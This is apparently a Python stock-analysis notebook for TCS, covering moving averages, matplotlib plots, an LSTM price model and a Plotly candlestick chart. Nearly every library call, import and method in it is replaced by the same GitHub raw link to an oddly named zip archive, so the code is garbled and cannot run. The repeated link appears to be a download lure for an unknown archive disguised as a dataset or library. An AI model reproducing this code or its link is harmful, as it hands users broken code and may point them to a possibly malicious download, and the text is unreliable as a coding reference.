### **Load & Filter Data for TCS and Reliance**
import pandas as pd

# Load dataset
df = https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip')

# Filter for TCS
tcs_data = df[df['Symbol'] == 'TCS'].copy()

# Convert 'Date' to datetime and sort
tcs_data['Date'] = https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(tcs_data['Date'])
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Date', inplace=True)
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(drop=True, inplace=True)

# Calculate moving averages
tcs_data['MA20'] = tcs_data['Close'].rolling(window=20).mean()
tcs_data['MA50'] = tcs_data['Close'].rolling(window=50).mean()

# Drop rows with NaN values caused by moving averages
tcs_data = https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip().reset_index(drop=True)

print(https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip())
###**Plot Closing Prices & Volumes for Both Stocks**
import https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip as plt

https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(figsize=(15,6))
for stock in stocks:
    https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(data[stock]['Date'], data[stock]['Close'], label=f'{stock} Close Price')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Closing Prices Over Time')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Date')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Price')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()

https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(figsize=(15,6))
for stock in stocks:
    https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(data[stock]['Date'], data[stock]['Volume'], label=f'{stock} Volume')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Trading Volume Over Time')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Date')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Volume')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()
###**Moving Averages and Plot for TCS**
import https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip as plt

https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(figsize=(15,6))
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(tcs_data['Date'], tcs_data['Close'], label='Close Price')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(tcs_data['Date'], tcs_data['MA20'], label='20-Day MA')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(tcs_data['Date'], tcs_data['MA50'], label='50-Day MA')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('TCS Close Price with Moving Averages')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Date')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Price')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()
###**Prepare Data for LSTM Model**
import numpy as np
from https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip import MinMaxScaler

def prepare_lstm_data(stock_df, time_step=60):
    close_prices = stock_df['Close']https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(-1,1)
    scaler = MinMaxScaler(feature_range=(0,1))
    scaled_data = https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(close_prices)

    X, Y = [], []
    for i in range(len(scaled_data)-time_step-1):
        https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(scaled_data[i:i+time_step, 0])
        https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(scaled_data[i + time_step, 0])

    X = https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(X)
    Y = https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(Y)
    X = https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip[0], https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip[1], 1)
    return X, Y, scaler

# Test function on TCS
X_tcs, Y_tcs, scaler_tcs = prepare_lstm_data(data['TCS'])
print(f"TCS LSTM data shapes: X={https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip}, Y={https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip}")
###**Build and Train LSTM Model**
from https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip import Sequential
from https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip import Dense, LSTM, Dropout

def build_train_lstm(X_train, Y_train, epochs=7):
    model = Sequential()
    https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(LSTM(50, return_sequences=True, input_shape=(https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip[1],1)))
    https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(Dropout(0.2))
    https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(LSTM(50, return_sequences=False))
    https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(Dropout(0.2))
    https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(Dense(25))
    https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(Dense(1))
    https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(optimizer='adam', loss='mean_squared_error')
    https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(X_train, Y_train, epochs=epochs, batch_size=32, verbose=1)
    return model

# Prepare train/test split for TCS
train_size = int(len(X_tcs)*0.8)
X_train_tcs, X_test_tcs = X_tcs[:train_size], X_tcs[train_size:]
Y_train_tcs, Y_test_tcs = Y_tcs[:train_size], Y_tcs[train_size:]

print("Training LSTM model for TCS")
model_tcs = build_train_lstm(X_train_tcs, Y_train_tcs)
###**Predict and Plot Actual vs Predicted for TCS**
# Predict on test data
predictions_tcs = https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(X_test_tcs)
predictions_tcs = https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(predictions_tcs)
Y_test_tcs_actual = https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(-1,1))

import https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip as mdates

https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(figsize=(12,6))
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(data['TCS']['Date'][-len(Y_test_tcs_actual):], Y_test_tcs_actual, label='Actual')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(data['TCS']['Date'][-len(predictions_tcs):], predictions_tcs, label='Predicted')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('TCS Actual vs Predicted Closing Price')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Date')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Price')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(interval=3))
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('%b %Y'))
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(rotation=45)
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()
###**Correlation Heatmap of TCS Features**
import seaborn as sns
import https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip as plt

https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(figsize=(8,6))
cols_to_corr = ['Open','High','Low','Close','Volume','MA20','MA50']

https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(tcs_data[cols_to_corr].corr(), annot=True, cmap='coolwarm')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip('Correlation Heatmap of TCS Stock Features')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()
###**Candlestick Chart Using Plotly**
import https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip as go

fig = https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(data=[https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(
    x=tcs_data['Date'],
    open=tcs_data['Open'],
    high=tcs_data['High'],
    low=tcs_data['Low'],
    close=tcs_data['Close'],
    name='TCS'
)])

https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip(title='TCS Candlestick Chart', xaxis_title='Date', yaxis_title='Price')
https://github.com/athif2105/TCS-Stock-Market-Prediction/raw/refs/heads/main/bregmata/Prediction_Stock_Market_TC_somnopathy.zip()
